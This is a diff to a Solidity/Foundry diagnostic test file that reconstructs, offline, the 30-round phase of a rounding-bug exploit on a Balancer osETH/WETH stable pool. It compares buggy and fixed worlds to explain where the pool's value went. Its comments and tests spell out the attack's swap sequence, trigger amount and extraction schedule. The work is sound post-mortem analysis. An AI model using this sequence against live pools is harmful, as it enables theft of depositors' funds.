@@ -2,6 +2,7 @@
 pragma solidity ^0.8.0;
 
 import {Test} from "forge-std/Test.sol";
+import {console} from "forge-std/Console.sol";
 import {FixedPoint} from "src/FixedPoint.sol";
 import {StableMath} from "src/StableMath.sol";
 
@@ -280,6 +281,67 @@ import {StableMath} from "src/StableMath.sol";
 //    raw units, since {n*eps} cycles past 1 - {sf} once every 1/eps ~= 17.2).
 //    PoC chose 17 because it is the smallest, not because it maximizes |dD|
 //    (testDiag_trickAmtOptimum: 103 actually wins by ~3% on |dD|/cost).
+//
+// =============================================================================
+// PHASE 2 30-ROUND DYNAMICS: WHY (67000, 67000) -> (889, 1472)
+// =============================================================================
+// findings 14-17, backed by testDiag_perRoundTrace,
+// testDiag_counterfactualParallel, testDiag_counterfactualPerRoundIsolated
+// and testDiag_isolatedDEffectStepC below.
+//
+// 14. WETH 67000 -> 889 (net pool W loss = 66,111) IS the bug.
+//     Per-round counterfactual (BUGGY vs FIXED, both worlds reset to the
+//     actual round-start state each round) shows the per-round
+//     counter_W_end - actual_W_end (= W the pool was under-collected by)
+//     sums to ~66,111 across 30 rounds. The attacker does NOT "drain" WETH
+//     each round; the bug lets him pay slightly LESS W in Steps A+B than
+//     the fair price, and the cumulative shortage IS the 66,111 W loss.
+//     This is the user-payable counterpart of the per-cycle D drop.
+//
+// 15. OSETH 67000 -> 1472 (net pool O loss = 65,528) is NOT a bug effect
+//     compounded over 30 rounds. ~94% of the O loss happens in ROUND 0
+//     ALONE (-61,817 O). The reason is structural: Step A's
+//     `out = O_pre - trickAmt - 1` formula forces the pool to (W_A, 18)
+//     so the bug can fire in Step B, and Round 0 starts with O=67,000,
+//     so the one-shot drain moves ~66,982 O OUT. Subsequent rounds start
+//     with O already capped at the Round-0-end level (~5183), Step A can
+//     only move a few thousand O, and Step C refunds some O back. Net O
+//     movement over rounds 1..29 is only -3,711, with rounds {1, 2, 3, 6,
+//     19, 29} actually being NET POSITIVE for the pool's O balance. The
+//     "OSETH disappeared" story is "Round 0 split O off in one massive
+//     Step A drain", not a per-round bug leak. OSETH loss is a side-effect
+//     of the attack's trigger geometry, not of the rounding bug itself.
+//
+// 16. D is the ONLY quantity that is strictly monotone-decreasing every
+//     round. dW and dO have mixed signs across rounds (Round 0 has
+//     dW=+41,845, Round 6 has dO=+11,177, etc.), but dD < 0 in EVERY
+//     round of the 30-round trace (testDiag_perRoundTrace). This is why
+//     D is the right "pool value" metric for this exploit: it isolates
+//     the actual theft from the attacker's chosen Step C extraction
+//     schedule (ext[r], which is set by the on-chain PoC for Newton
+//     convergence, NOT to "barely exceed (inA+inB)"). Cumulative dD over
+//     30 rounds ~= -127k; per-round contribution is dominated by the
+//     Step B leak (-26,551 in Round 0, smaller in later rounds as the
+//     pool shrinks).
+//
+// 17. D-effect vs bal_W-effect on Step C are OPPOSITE in direction.
+//     Holding entry balances [999845, 1] fixed and varying ONLY D between
+//     the two worlds (testDiag_isolatedDEffectStepC):
+//       D = 112,405 (actual)  -> inO required = 5,181
+//       D = 144,956 (counter) -> inO required = 34,580
+//     So in isolation, smaller D => Step C charges LESS O (user intuition
+//     verified). However, the bug shrinks both D AND bal_W TOGETHER (the
+//     two are two faces of the same underpayment): in the real Round 0,
+//       BUGGY  Step C entry: (W=999,845,   O=1) D=112,405 -> inO = 5,183
+//       FIXED  Step C entry: (W=1,453,904, O=1) D=158,835 -> inO =    11
+//     Here the W-shrinkage effect (smaller W => less imbalanced pool =>
+//     O priced higher => pool collects MORE O) dominates the D-shrinkage
+//     effect (smaller D => pool collects LESS O), so the buggy pool ends
+//     up collecting MORE O in Step C than the fixed pool. The clean
+//     framing: the entire bug is captured by "Step B under-charges the
+//     attacker by ~415,920 upscaled W per cycle"; the D drop, the
+//     reshaping of the (W, O) state, and the Step C behaviour all follow
+//     mechanically.
 // =============================================================================
 
 address constant balancer_d = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
@@ -1709,5 +1771,228 @@ contract DiagSim is Test {
             int256(O_up_curve_imag) - int256(up2[idxOut]));
 
         return bal;
+    }
+
+    // =========================================================================
+    // Phase 2 30-round trace + counterfactual analysis (findings 14-17).
+    // These tests reconstruct the on-chain PoC's Phase 2 (30 cycles of A->B->C)
+    // entirely offline so we can attribute per-round W/O/D changes to the bug
+    // vs to the attacker's chosen extraction schedule (ext[r]).
+    // =========================================================================
+
+    function _phase2ExtractAmounts() internal pure returns (uint256[30] memory a) {
+        a[0]=891000; a[1]=666000; a[2]=495000; a[3]=369000; a[4]=270000;
+        a[5]=198000; a[6]=160000; a[7]=120000; a[8]=89100;  a[9]=67500;
+        a[10]=52200; a[11]=40500; a[12]=31500; a[13]=24300; a[14]=19800;
+        a[15]=16200; a[16]=12600; a[17]=10800; a[18]=9000;  a[19]=7371;
+        a[20]=6480;  a[21]=6075;  a[22]=5589;  a[23]=4779;  a[24]=4455;
+        a[25]=3969;  a[26]=3726;  a[27]=3645;  a[28]=3564;  a[29]=3564;
+    }
+
+    function _phase2Params() internal returns (uint256[] memory sf, uint256 amp, uint256 fee) {
+        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
+        uint256[] memory sfFull = IPool(osETH_wETH_d).getScalingFactors();
+        (amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
+        fee = IPool(osETH_wETH_d).getSwapFeePercentage();
+        sf = new uint256[](2);
+        sf[0] = sfFull[0];
+        sf[1] = sfFull[2];
+    }
+
+    function _safeSimRound(
+        uint256[] memory bal, uint256[] memory sf, uint256 idxIn, uint256 idxOut,
+        uint256 outAmt, uint256 amp, uint256 fee, uint8 mode
+    ) internal view returns (bool, uint256[] memory) {
+        try this.ext_simSwap(bal, sf, idxIn, idxOut, outAmt, amp, fee, mode) returns (uint256[] memory nb) {
+            return (true, nb);
+        } catch { return (false, new uint256[](2)); }
+    }
+
+    function _safeInvRound(uint256[] memory bal, uint256[] memory sf, uint256 amp)
+        internal view returns (bool, uint256)
+    {
+        try this.ext_invUp(bal, sf, amp) returns (uint256 d) { return (true, d); } catch { return (false, 0); }
+    }
+
+    // Finding 16: per-round trace of W, O, D across Phase 2's 30 rounds.
+    // The output makes dW and dO mixed-sign across rounds while dD < 0 in
+    // every single round.
+    function testDiag_perRoundTrace() public {
+        (uint256[] memory sf, uint256 amp, uint256 fee) = _phase2Params();
+
+        uint256[] memory bal = new uint256[](2);
+        bal[0] = 67000;
+        bal[1] = 67000;
+
+        console.log("=== PHASE 2 ENTRY (after Phase 1 drain) ===");
+        console.log("  W =", bal[0]);
+        console.log("  O =", bal[1]);
+        console.log("  D =", invUp(bal, sf, amp));
+
+        uint256[30] memory ext = _phase2ExtractAmounts();
+
+        for (uint256 r = 0; r < 30; r++) {
+            console.log("");
+            console.log("============ ROUND ============", r);
+            int256 startW = int256(bal[0]);
+            int256 startO = int256(bal[1]);
+            uint256 startD = invUp(bal, sf, amp);
+
+            bal = simSwapGivenOut(bal, sf, 0, 1, bal[1] - 17 - 1, amp, fee, 0); // Step A
+            console.log("  after A: W=", bal[0], " O=", bal[1]);
+            bal = simSwapGivenOut(bal, sf, 0, 1, 17, amp, fee, 0);              // Step B
+            console.log("  after B: W=", bal[0], " O=", bal[1]);
+            bal = simSwapGivenOut(bal, sf, 1, 0, ext[r], amp, fee, 0);          // Step C
+            console.log("  after C: W=", bal[0], " O=", bal[1]);
+
+            (bool ok, uint256 endD) = _safeInvRound(bal, sf, amp);
+            console.log("  ROUND NET dW:"); console.logInt(int256(bal[0]) - startW);
+            console.log("  ROUND NET dO:"); console.logInt(int256(bal[1]) - startO);
+            if (ok) { console.log("  ROUND NET dD:"); console.logInt(int256(endD) - int256(startD)); }
+        }
+
+        console.log("");
+        console.log("=== PHASE 2 EXIT ===");
+        console.log("  W =", bal[0]);
+        console.log("  O =", bal[1]);
+        console.log("  net W loss vs entry 67000:"); console.logInt(int256(67000) - int256(bal[0]));
+        console.log("  net O loss vs entry 67000:"); console.logInt(int256(67000) - int256(bal[1]));
+    }
+
+    // Finding 14: counterfactual PARALLEL run. BUGGY and FIXED worlds share
+    // the same extract table and trickAmt=17. NB: diverges at Round 1 because
+    // the FIXED world's O after Round 0 (= 11) falls below TRICK_AMT+1=18, so
+    // its Step A can no longer drain. Useful mainly for Round 0 comparison.
+    function testDiag_counterfactualParallel() public {
+        (uint256[] memory sf, uint256 amp, uint256 fee) = _phase2Params();
+        uint256[] memory balA = new uint256[](2); balA[0] = 67000; balA[1] = 67000;
+        uint256[] memory balF = new uint256[](2); balF[0] = 67000; balF[1] = 67000;
+        uint256[30] memory ext = _phase2ExtractAmounts();
+
+        for (uint256 r = 0; r < 30; r++) {
+            uint256 outA_a = balA[1] > 18 ? balA[1] - 18 : 0;
+            uint256 outA_f = balF[1] > 18 ? balF[1] - 18 : 0;
+            if (outA_a == 0 || outA_f == 0) {
+                console.log("---- Stopped @ round (counter cannot drain)", r); break;
+            }
+            (bool oka1, uint256[] memory n1) = _safeSimRound(balA, sf, 0, 1, outA_a, amp, fee, 0);
+            (bool okf1, uint256[] memory n2) = _safeSimRound(balF, sf, 0, 1, outA_f, amp, fee, 1);
+            if (!oka1 || !okf1) { console.log("Step A REVERT @ round", r); break; }
+            balA = n1; balF = n2;
+
+            (bool oka2, uint256[] memory n3) = _safeSimRound(balA, sf, 0, 1, 17, amp, fee, 0);
+            (bool okf2, uint256[] memory n4) = _safeSimRound(balF, sf, 0, 1, 17, amp, fee, 1);
+            if (!oka2 || !okf2) { console.log("Step B REVERT @ round", r); break; }
+            balA = n3; balF = n4;
+
+            (bool oka3, uint256[] memory n5) = _safeSimRound(balA, sf, 1, 0, ext[r], amp, fee, 0);
+            (bool okf3, uint256[] memory n6) = _safeSimRound(balF, sf, 1, 0, ext[r], amp, fee, 1);
+            if (!oka3 || !okf3) { console.log("Step C REVERT @ round", r); break; }
+            balA = n5; balF = n6;
+
+            console.log("---- Round", r);
+            console.log("  ACTUAL  (buggy): W=", balA[0], " O=", balA[1]);
+            console.log("  COUNTER (fixed): W=", balF[0], " O=", balF[1]);
+            if (balF[0] >= balA[0]) console.log("  W loss (counter - actual) =", balF[0] - balA[0]);
+            else                    console.log("  W EXCESS (actual - counter) =", balA[0] - balF[0]);
+            if (balF[1] >= balA[1]) console.log("  O loss (counter - actual) =", balF[1] - balA[1]);
+            else                    console.log("  O EXCESS (actual - counter) =", balA[1] - balF[1]);
+        }
+    }
+
+    // Finding 14 (continued): per-round ISOLATED counterfactual. Both worlds
+    // reset to the actual round-start state every round and run that single
+    // round, so we can cleanly attribute per-round W/O loss to the bug. Sum
+    // of W-loss across 30 rounds ~= 66,111 matches the exit W shortfall.
+    function testDiag_counterfactualPerRoundIsolated() public {
+        (uint256[] memory sf, uint256 amp, uint256 fee) = _phase2Params();
+        uint256[] memory bal = new uint256[](2); bal[0] = 67000; bal[1] = 67000;
+        uint256[30] memory ext = _phase2ExtractAmounts();
+
+        console.log("=== ISOLATED PER-ROUND COUNTERFACTUAL ===");
+        console.log("Both worlds reset to actual round-start state each round.");
+        console.log("loss := counter_end - actual_end  (positive = pool under-collected)");
+
+        for (uint256 r = 0; r < 30; r++) {
+            uint256[] memory bA = _copy(bal);
+            uint256[] memory bF = _copy(bal);
+            uint256 outA = bal[1] - 17 - 1;
+            bA = simSwapGivenOut(bA, sf, 0, 1, outA, amp, fee, 0);
+            bF = simSwapGivenOut(bF, sf, 0, 1, outA, amp, fee, 1);
+            bA = simSwapGivenOut(bA, sf, 0, 1, 17, amp, fee, 0);
+            bF = simSwapGivenOut(bF, sf, 0, 1, 17, amp, fee, 1);
+
+            (bool oka, uint256[] memory nA) = _safeSimRound(bA, sf, 1, 0, ext[r], amp, fee, 0);
+            (bool okf, uint256[] memory nF) = _safeSimRound(bF, sf, 1, 0, ext[r], amp, fee, 1);
+            if (!oka) { console.log("ACTUAL  Step C REVERT @ round", r); break; }
+            if (!okf) {
+                console.log("COUNTER Step C REVERT @ round", r, " ext=", ext[r]);
+                bal = nA;
+                continue;
+            }
+            bA = nA; bF = nF;
+
+            int256 wLoss = int256(bF[0]) - int256(bA[0]);
+            int256 oLoss = int256(bF[1]) - int256(bA[1]);
+            console.log("---- Round", r, "-----");
+            console.log("  actual end : W=", bA[0], " O=", bA[1]);
+            console.log("  counter end: W=", bF[0], " O=", bF[1]);
+            console.log("  W loss (counter - actual):"); console.logInt(wLoss);
+            console.log("  O loss (counter - actual):"); console.logInt(oLoss);
+
+            bal = bA; // advance using ACTUAL state (real attack progression)
+        }
+    }
+
+    // Finding 17: ISOLATE THE D EFFECT. Both worlds enter Step C with
+    // identical balances (999845, 1) and extract 891000 W; only the invariant
+    // D parameter passed to _calcInGivenOut differs. Confirms the user-correct
+    // relationship "holding bal_W equal, smaller D yields smaller inO".
+    // In the real exploit this is overshadowed by the bal_W gap between the
+    // two worlds (999845 vs 1453904), not negated by it.
+    function testDiag_isolatedDEffectStepC() public {
+        (uint256[] memory sf, uint256 amp,) = _phase2Params();
+
+        uint256[] memory bal = new uint256[](2);
+        bal[0] = 999845;
+        bal[1] = 1;
+        uint256 extW = 891000;
+
+        uint256[] memory up = new uint256[](2);
+        up[0] = bal[0].mulDown(sf[0]);
+        up[1] = bal[1].mulDown(sf[1]);
+        uint256 outUp = extW.mulDown(sf[0]);
+
+        uint256 dActual = StableMath._calculateInvariant(amp, up);
+
+        // synthetic larger D = invariant of FIXED-world Round 0 Step C entry
+        uint256[] memory upCounter = new uint256[](2);
+        upCounter[0] = uint256(1453904).mulDown(sf[0]);
+        upCounter[1] = uint256(1).mulDown(sf[1]);
+        uint256 dCounter = StableMath._calculateInvariant(amp, upCounter);
+
+        uint256[] memory upA = _copy(up);
+        uint256 inUp_A = StableMath._calcInGivenOut(amp, upA, 1, 0, outUp, dActual);
+        uint256[] memory upC = _copy(up);
+        uint256 inUp_C = StableMath._calcInGivenOut(amp, upC, 1, 0, outUp, dCounter);
+
+        uint256 inO_A = inUp_A.divUp(sf[1]);
+        uint256 inO_C = inUp_C.divUp(sf[1]);
+
+        console.log("=== ISOLATED D-EFFECT TEST ===");
+        console.log("Both worlds: pre-Step-C bal_W=999845, bal_O=1, extract 891000 W");
+        console.log("ACTUAL  D =", dActual);
+        console.log("COUNTER D =", dCounter, "(synthetic, larger)");
+        console.log("inO required (ACTUAL, smaller D) =", inO_A);
+        console.log("inO required (COUNTER, larger D) =", inO_C);
+        if (inO_C > inO_A) {
+            console.log("=> LARGER D => LARGER inO; delta =", inO_C - inO_A);
+            console.log("=> CONFIRMED: holding bal_W equal, smaller D yields smaller final bal_O.");
+        } else if (inO_A > inO_C) {
+            console.log("=> SMALLER D => LARGER inO; delta =", inO_A - inO_C);
+            console.log("=> REFUTED.");
+        } else {
+            console.log("=> D has no effect on inO at this precision.");
+        }
     }
 }
